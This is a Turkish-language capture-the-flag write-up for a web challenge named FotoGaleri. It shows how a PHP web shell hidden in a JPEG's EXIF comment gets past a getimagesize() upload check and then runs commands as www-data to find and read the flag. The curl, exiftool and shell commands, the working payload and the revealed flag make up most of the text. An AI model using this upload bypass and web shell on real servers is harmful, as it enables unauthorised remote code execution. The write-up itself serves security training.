# 🎯 FotoGaleri - Web Challenge

<p align="center">
  <img src="https://img.shields.io/badge/Web-Challenge-darkblue?style=for-the-badge" alt="Web">
  <img src="https://img.shields.io/badge/Difficulty-Orta-darkorange?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-File Upload Bypass-purple?style=for-the-badge" alt="File Upload">
</p>

---

## 📋 Soru Bilgileri

**Kategori:** Web  
**Seviye:** Orta  
**Puan:** 500  

**Challenge URL:** `http://68.183.213.255:9013`

---

## 🔍 Analiz

**Hedef:** Fotoğraf galerisi uygulamasındaki file upload bypass açığını kullanarak RCE elde etmek ve flag'i okumak

**Strateji:** Keşif → Upload bypass → RCE → Flag extraction

**İpuçları:**
- 📸 Fotoğraf yükleme formu var
- 🔍 Apache 2.4.54 + PHP 7.4.33
- 💡 `upload.php` endpoint'i mevcut
- 🔑 Sunucu resim doğrulaması yapıyor

---

## ✅ Çözüm Adımları

### 🔎 **Adım 1: Keşif**

```bash
curl -i "http://68.183.213.255:9013"
```

**Çıktı (önemli kısımlar):**
```
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Set-Cookie: PHPSESSID=...
```

**ANALİZ:**
- ✅ Apache + PHP backend
- ✅ `upload.php` endpoint'i var
- ✅ Session bazlı yapı

---

### 📤 **Adım 2: İlk Upload Denemesi**

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php

curl -L -X POST "http://68.183.213.255:9013/upload.php" \
  -F "photo=@shell.php;type=image/jpeg"
```

**Çıktı:**
```
❌ Cannot read image information
```

**ANALİZ:**
- ❌ Direkt PHP shell reddedildi
- 💡 Sunucu `getimagesize()` ile resim doğrulaması yapıyor
- 🎯 Gerçek bir resim başlığı gerekiyor!

---

### 🖼️ **Adım 3: EXIF Metadata Bypass**

Sunucu `getimagesize()` ile dosyayı kontrol ediyor. Gerçek bir JPEG dosyası indirip EXIF Comment alanına PHP payload gömdük:

```bash
# Önce session al
SESSION=$(curl -si "http://68.183.213.255:9013/" | grep "PHPSESSID" | grep -o "PHPSESSID=[^;]*")

# Gerçek bir JPEG indir
wget -q "https://httpbin.org/image/jpeg" -O real.jpg

# EXIF Comment alanına PHP shell göm
exiftool -Comment='<?php system($_GET["cmd"]); ?>' real.jpg -o shell2.jpg

# Upload et
curl -L -X POST "http://68.183.213.255:9013/upload.php" \
  -b "$SESSION" \
  -F "photo=@shell2.jpg;type=image/jpeg"
```

**Çıktı:**
```
✅ Photo uploaded successfully!
uploads/user_3316/shell2.jpg
```

**ANALİZ:**
- ✅ JPEG magic bytes kontrolünü geçti!
- ✅ EXIF Comment içindeki PHP kodu sunucuya yüklendi
- 🎯 Dosya `uploads/user_3316/shell2.jpg` olarak kaydedildi

---

### 💻 **Adım 4: RCE Testi**

```bash
curl "http://68.183.213.255:9013/uploads/user_3316/shell2.jpg?cmd=id"
```

**Çıktı:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**ANALİZ:**
- ✅ **RCE başarılı!** `www-data` olarak komut çalıştırabiliyoruz
- 💡 EXIF Comment içindeki PHP kodu execute edildi
- 🎯 Tam yetkili shell elde edildi

---

### 🔍 **Adım 5: Flag Lokasyonu Bul**

```bash
curl "http://68.183.213.255:9013/uploads/user_3316/shell2.jpg?cmd=find+/+-name+flag*+2>/dev/null"
```

**Çıktı (önemli kısım):**
```
/var/www/html/flag.txt
```

---

### 🚩 **Adım 6: Flag'i Oku**

```bash
curl "http://68.183.213.255:9013/uploads/user_3316/shell2.jpg?cmd=cat+/var/www/html/flag.txt"
```

**Çıktı:**
```
PITO{jp3g_3x1f_p0lygl0t_m3t4d4t4_pwn3d}
```

---

## 🚩 **FLAG**
```
PITO{jp3g_3x1f_p0lygl0t_m3t4d4t4_pwn3d}
```

---

## 🛠️ **Kullanılan Araçlar**

<table>
<tr>
<td align="center">🌐<br><b>curl</b><br><sub>HTTP requests</sub></td>
<td align="center">📷<br><b>exiftool</b><br><sub>EXIF manipulation</sub></td>
<td align="center">🔍<br><b>wget</b><br><sub>File download</sub></td>
<td align="center">🐚<br><b>bash</b><br><sub>Command line</sub></td>
</tr>
</table>

---

## 💭 **Çözüm Akış Şeması**

```
🎯 FotoGaleri Challenge
       ↓
🔍 Keşif
   → Apache 2.4.54 + PHP 7.4.33
   → upload.php endpoint
   → Session bazlı yapı
       ↓
📤 İlk Upload Denemesi
   → shell.php → ❌ "Cannot read image information"
   → Sunucu getimagesize() ile kontrol ediyor!
       ↓
🖼️ EXIF Bypass
   → Gerçek JPEG indirildi
   → exiftool ile EXIF Comment'e PHP payload eklendi
   → shell2.jpg upload → ✅ Başarılı!
       ↓
💻 RCE Testi
   → ?cmd=id → uid=33(www-data) ✅
   → Tam shell erişimi!
       ↓
🔍 Flag Lokasyonu
   → find / -name flag* → /var/www/html/flag.txt
       ↓
🚩 cat /var/www/html/flag.txt
   → PITO{jp3g_3x1f_p0lygl0t_m3t4d4t4_pwn3d}
       ↓
✅ FLAG: PITO{jp3g_3x1f_p0lygl0t_m3t4d4t4_pwn3d}
```
